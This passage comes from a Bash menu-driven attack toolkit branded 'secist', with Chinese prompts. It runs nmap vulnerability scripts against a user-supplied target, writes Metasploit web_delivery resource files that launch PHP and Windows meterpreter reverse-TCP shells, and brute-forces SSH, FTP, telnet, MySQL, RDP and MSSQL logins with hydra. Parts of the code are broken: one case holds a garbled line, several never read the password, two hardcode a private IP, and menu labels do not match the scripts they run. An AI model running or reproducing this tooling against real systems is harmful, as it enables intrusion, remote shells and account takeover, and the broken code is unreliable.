			echo -e $white "	  >>What is your IP Target or Host：\c"
			read ip
			echo -e $white "      >>What is your Port Target or Host: \c"
			read port
			nmap --script ftp-vuln-cve2010-4221 -p $port $ip
			;;
			11)
			echo -e $white "secist>http-adobe-coldfusion-apsa1301"
			echo -e $white "	  >>What is your IP Target or Host：\c"
			read ip
			nmap -sV -p 80 --script http-adobe-coldfusion-apsa1301 --script-args basepath=/cf/adminapi/ $ip
			;;
			12)
			echo -e $white "secist>http-aspnet-debug"
			echo -e $white "	  >>What is your IP Target or Host：\c"
			read ip
			nmap --script http-debug --script-args http-aspnet-debug.path=/path $ip
			;;
			13)
			echo -e $white "secist>http-avaya-ipoffice-users"
			echo -e $white "	  >>What is your IP Target or Host：\c"
			read ip
			nmap --sV --script http-avaya-ipoffice-users $ip
			;;
			14)
			echo -e $white "secist>http-awstatstotals-exec"
			echo -e $white "	  >>What is your IP Target or Host：\c"
			read ip
			nmap --sV --script http-awstatstotals-exec.nse --script-args 'http-awstatstotals-exec.cmd="uname -a", http-awstatstotals-exec.uri=/awstats/index.php' $ip
			;;
			15)
			echo -e $white "secist>http-axis2-dir-traversal"
			echo -e $white "	  >>What is your IP Target or Host：\c"
			read ip
			nmap -p 80 --script http-axis2-dir-traversal $ip
			;;
			16)
			echo -e $white "secist>http-cross-domain-policy"
			echo -e $white "	  >>What is your IP Target or Host：\c"
			read ip
			nmap --script http-crossdomainxml --script-args http.domain-lookup=true $ip
			;;
			17)
			echo -e $white "secist>http-csrf"
			echo -e $white "	  >>What is your IP Target or Host：\c"
			read ip
			nmap -p 80 --script http-csrf.nse $ip
			;;
			18)
			echo -e $white "secist>http-dlink-backdoor"
			echo -e $white "	  >>What is your IP Target or Host：\c"
			read ip
			nmap -sV --script http-dlink-backdoor $ip
			;;
			19)
			echo -e $white "secist>afp-path-vuln"
			echo -e $white "	  >>What is your IP Target or Host：\c"
			read ip
			nmap -p 80 --script http-dombased-xss.nse $ip
			;;
			20)
			echo -e $white "secist>http-dombased-xss"
			echo -e $white "	  >>What is your IP Target or Host：\c"
			read ip
			nmap -sV --script=http-enum $ip
			;;
			21)
			Client
			;;
		esac
}
Scanner(){
	clear
	echo -e $okegreen ""
	echo  "                  =================================="
	echo  "                  |<----.                    .---->|"
	echo  "                  |<----|========O)))========|---->|"
	echo  "                  |<----'                    '---->|"
	echo  "                  |           Web Scanner          |"
	echo  "                  |<----.                    .---->|"
	echo  "                  |<----|========O)))========|---->|"
	echo  "                  |<----'                    '---->|"
	echo -e $okegreen"                  =================================="
	echo -e $cyan "          "
	echo -e $okegreen"                  =================================="
	echo ""
	echo -e $white"		  [$okegreen"1"$white]$white               Wpscan Scanner       "
	echo -e $white"		  [$okegreen"2"$white]$white               Wmap   Scanner       "
	echo -e $white"		  [$okegreen"3"$white]$white               nikto  Scanner       "
	echo -e $white"		  [$okegreen"4"$white]$white               back       "
	echo ""
	echo -e $white "secist> \c" 
	read webnum
		case $webnum in
			1)
			echo -e $white "secist>Wpscan Scanner"
			echo -e $white "      >>请输入目标地址"
			read ip
			wpscan --url $ip --enumerate
			;;
			2)
			echo -e $white "secist>Wmap Scanner"
			echo -e $white "      >>请输入目标地址"
			read ip
			echo "load wmap" >> wmap.rc
            echo "wmap_sites -a $ip" >> wmap.rc
            echo "wmap_sites -l" >> wmap.rc
            echo "wmap_targets -D 0" >> wmap.rc
            echo "wmap_targets -L" >> wmap.rc
            echo "wmap_run -t" >> wmap.rc
            echo "wmap_run -e" >> wmap.rc
            echo "vulns" >> wmap.rc
            msfconsole -r wmap.rc
            rm  wmap.rc
            ;;
            3)
			echo -e $white "secist>Wmap Scanner"
			echo -e $white "      >>请输入目标地址"
			read ip
			nikto -host $ip
			;;
			4)
			Client
			;;
		esac
}
web_delivery(){
	clear
	echo -e $red ""
	echo "                          80G08        "
	echo "                             8G#G@8  "
	echo "                               8##0  "
	echo "                                0##G8    "
	echo "                                  ####08 "
	echo "                                   8#####8   "
	echo "                                     G#####8   "
	echo "                                      8G#####8   "
	echo "                   #8#########0         #######8   "
	echo "                       8#######0          0#88#####    "
	echo "                         8G####8         8 8#8@@8###   "
	echo "                            8###        G8   8@G######   "
	echo "                             8##88       8     8######8    "
	echo "                               G##088          80G##G080   "
	echo "                                 88000000008880#      000    "
	echo "                                       9               0 "
	echo "             "
	echo -e $white "		  [$okegreen"1"$white]$white               web_delivery(php)"
    echo -e $white "		  [$okegreen"2"$white]$white               web_delivery(Python)"
    echo -e $white "		  [$okegreen"3"$white]$white               web_delivery(PowerShell)"
    echo ""
    echo -e $white "secist> \c"
    read delinum
    	case $delinum in
    		1)
			echo -e "请输入你的ip地址: \c"
		    read ip
		    echo -e "请输入你的端口: \c"
		    read port
		    echo -e "  +------------++-------------------------++-----------------------+"
		    echo -e "  | Name       ||  Descript   	          || Your Input              "
		    echo -e "  +------------++-------------------------++-----------------------+"
		    echo -e "  | LHOST      ||  The Listen Addres      || $ip                    "
		    echo -e "  | LPORT      ||  The Listen Ports       || $port                  "
		    echo -e "  +------------++-------------------------++-----------------------+"
		    echo -e "请稍后"
		    echo  "################################################################## "
		    echo "use exploit/multi/script/web_delivery" >> resource/php.rc
		    echo "set PAYLOAD php/meterpreter/reverse_tcp" >> resource/php.rc
		    echo "set TARGET 1" >> resource/php.rc
		    echo "set LHOST $ip" >> resource/php.rc
		    echo "set LPORT $port" >> resource/php.rc
		    echo "set URIPATH /" >> resource/php.rc
		    echo "run" >> resource/php.rc
		    msfconsole -r resource/php.rc
    		;;
    		2)
			echo -e "请输入你的ip地址: \c"
		    read ip
		    echo -e "请输入你的端口: \c"
		    read port
		    echo -e "  +------------++-------------------------++-----------------------+"
		    echo -e "  | Name       ||  Descript   	          || Your Input              "
		    echo -e "  +------------++-------------------------++-----------------------+"
		    echo -e "  | LHOST      ||  The Listen Addres      || $ip                    "
		    echo -e "  | LPORT      ||  The Listen Ports       || $port                  "
		    echo -e "  +------------++-------------------------++-----------------------+"
		    echo -e "请稍后"
		    echo  "################################################################## "
		    echo "use exploit/multi/script/web_delivery" >> resource/php.rc
		    echo "set LHOST $ip" >> resource/php.rc
		    echo "set LPORT $port" >> resource/php.rc
		    echo "set URIPATH /" >> resource/php.rc
		    echo "run" >> resource/php.rc
		    msfconsole -r resource/php.rc
    		;;
    		3)
			echo -e "请输入你的ip地址: \c"
		    read ip
		    echo -e "请输入你的端口: \c"
		    read port
		    echo -e "  +------------++-------------------------++-----------------------+"
		    echo -e "  | Name       ||  Descript   	          || Your Input              "
		    echo -e "  +------------++-------------------------++-----------------------+"
		    echo -e "  | LHOST      ||  The Listen Addres      || $ip                    "
		    echo -e "  | LPORT      ||  The Listen Ports       || $port                  "
		    echo -e "  +------------++-------------------------++-----------------------+"
		    echo -e "请稍后"
		    echo  "################################################################## "
		    echo "use exploit/multi/script/web_delivery" >> resource/php.rc
		    echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> resource/php.rc
		    echo "set TARGET 2" >> resource/php.rc
		    echo "set LHOST $ip" >> resource/php.rc
		    echo "set LPORT $port" >> resource/php.rc
		    echo "set URIPATH /" >> resource/php.rc
		    echo "run" >> resource/php.rc
		    msfconsole -r resource/php.rc
    		;;
    		*)
			Client
			;;
    	esac
}
Brute(){
	clear
	  echo "  "
	  echo "                "
	  echo -e $okegreen"                       /^--^\     /^--^\     /^--^\   $cyan"
	  echo -e $okegreen"                       \____/     \____/     \____/   $cyan "
	  echo -e $okegreen"                      /      \   /      \   /      \  $cyan"
	  echo -e $okegreen"                     |        | |        | |        | $cyan "
	  echo -e $okegreen"                      \__  __/   \__  __/   \__  __/  $cyan  Brute-force attack "
	  echo " |^|^|^|^|^|^|^|^|^|^|^|^\ \^|^|^|^/ /^|^|^|^|^\ \^|^|^|^|^|^|^|^|^|^|^|^| "
	  echo " | | | | | | | | | | | | |\ \| | |/ /| | | | | | \ \ | | | | | | | | | | | "
	  echo " ########################/ /######\ \###########/ /####################### "
	  echo " | | | | | | | | | | | | \/| | | | \/| | | | | |\/ | | | | | | | | | | | | "
	  echo " |_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_| "
	  echo -e $white " "
      echo -e $white "		  [$okegreen"1"$white]$white              Crack SSH"
      echo -e $white "		  [$okegreen"2"$white]$white              Crack FTP"
      echo -e $white "		  [$okegreen"3"$white]$white              Crack teamspeak"
      echo -e $white "		  [$okegreen"4"$white]$white              Crack telnet"
      echo -e $white "		  [$okegreen"5"$white]$white              Crack Mysql"
      echo -e $white "		  [$okegreen"6"$white]$white              Crack Remote login"
      echo -e $white "		  [$okegreen"7"$white]$white              Crack mssql"
      echo -e $white "		  [$okegreen"7"$white]$white              back"
	  echo ""
	  echo -e $white "secist> \c"
	  read brutenum
	  	case $brutenum in
	  		1)
            echo -e $white "secist>Brute force(Crack SSH)"
            echo -e $white "            >>请输入目标地址: \c"
            read target
            echo -e $white "secist>Brute force(Crack SSH)"
            echo -e $white "            >>请输入用户或者用户字典地址: \c"
            read user
            echo -e $white "secist>Brute force(Crack SSH)"
            echo -e $white "            >>请输入密码或者密码字典地址: \c"
            read pass
            hydra -L $user -P $pass -t 16 -vV -e ns $target ssh
            ;;
            2)
            echo -e $white "secist>Brute force(Crack FTP)"
            echo -e $white "            >>请输入目标地址: \c"
            read target
            echo -e $white "secist>Brute force(Crack FTP)"
            echo -e $white "            >>请输入用户或者用户字典地址: \c"
            read user
            echo -e $white "secist>Brute force(Crack FTP)"
            echo -e $white "            >>请输入密码或者密码字典地址: \c"
            read pass
            hydra $target ftp -l $user -P $pass -t 16 -vV
            ;;
            3)
            echo -e $white "secist>Brute force(Crack teamspeak)"
            echo -e $white "            >>请输入目标地址: \c"
            read target
            echo -e $white "secist>Brute force(Crack teamspeak)"
            echo -e $white "            >>请输入用户或者用户字典地址: \c"
            read user
            echo -e $white "secist>Brute force(Crack teamspeak)"
            echo -e $white "            >>请输入密码或者密码字典地址: \c"
            read passser -P $pass -s $port -vV $target teamspeak
            ;;
            4)
            echo -e $white "secist>Brute force(Crack telnet)"
            echo -e $white "            >>请输入目标地址: \c"
            read target
            echo -e $white "secist>Brute force(Crack telnet)"
            echo -e $white "            >>请输入用户或者用户字典地址: \c"
            read user
            echo -e $white "secist>Brute force(Crack telnet)"
            echo -e $white "            >>请输入密码或者密码字典地址: \c"
            hydra $target telnet -l $user -P $pass -t 32 -s 23 -e ns -f -V
            ;;
            5)
            echo -e $white "secist>Brute force(Crack Mysql)"
            echo -e $white "            >>请输入目标地址: \c"
            read target
            echo -e $white "secist>Brute force(Crack Mysql)"
            echo -e $white "            >>请输入用户或者用户字典地址: \c"
            read user
            echo -e $white "secist>Brute force(Crack Mysql)"
            echo -e $white "            >>请输入密码或者密码字典地址: \c"
            hydra -L $user -P $pass 192.168.1.103 mysql -vv
            ;;
            6)
            echo -e $white "secist>Brute force(Crack Remote login)"
            echo -e $white "            >>请输入目标地址: \c"
            read target
            echo -e $white "secist>Brute force(Crack Remote login)"
            echo -e $white "            >>请输入用户或者用户字典地址: \c"
            read user
            echo -e $white "secist>Brute force(Crack Remote login)"
            echo -e $white "            >>请输入密码或者密码字典地址: \c"
            hydra $target rdp -L $user -P $pass -V 
            ;;
            7)
            echo -e $white "secist>Brute force(Crack Remote login)"
            echo -e $white "            >>请输入目标地址: \c"
            read target
            echo -e $white "secist>Brute force(Crack Remote login)"
            echo -e $white "            >>请输入用户或者用户字典地址: \c"
            read user
            echo -e $white "secist>Brute force(Crack Remote login)"
            echo -e $white "            >>请输入密码或者密码字典地址: \c"
			hydra -L $user -P $pass 192.168.1.103 mssql -vv
			;;
			8)
			Client
			;;
	  	esac
}
meun
